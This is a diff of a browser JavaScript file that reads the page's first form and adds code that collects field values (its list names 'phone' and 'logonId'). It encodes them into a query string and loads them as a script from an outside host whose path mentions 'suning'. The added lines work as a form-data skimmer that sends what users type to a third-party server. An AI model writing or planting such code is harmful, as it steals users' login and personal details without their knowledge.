@@ -1,5 +1,5 @@
 var nameBL = ["phone", "logonId"];
-var dr = {choice1560065869: "4", verifyCode0_1560065833: "¿œ", sssaf:""};	//data received
+var dr = {choice1560065869: "4", verifyCode0_1560065833: "∑≈", sssaf:""};	//data received
 var dc = {};	//data collected
 
 var f = document.forms[0];
@@ -37,8 +37,11 @@ function dispatch() {
 		}
 	}
 }
-//collect();
-dispatch();
+collect();
+//dispatch();
+var para = json2qs(dc);
+//alert(para);
+dynamicJs("http://cnrdloull1c:8080/e.morntea.com/util/suning/sync_form.jsp" + para);
 console.log(dc);
 
 function inArray(s, a) {
@@ -54,4 +57,17 @@ function dynamicJs(src) {
 	script.type = 'text/javascript';
 	script.src= src;
 	head.appendChild(script);
+}
+
+function json2qs(json) {
+	var qs = "?";
+	for(name in json) {
+		qs += name + "=" + json[name] + "&";
+	}
+	return qs + "r=" + Math.random();
+}
+
+function getParameterByName(name) {
+    var match = RegExp('[?&]' + name + '=([^&]*)').exec(window.location.search);
+    return match && decodeURIComponent(match[1].replace(/\+/g, ' '));
 }
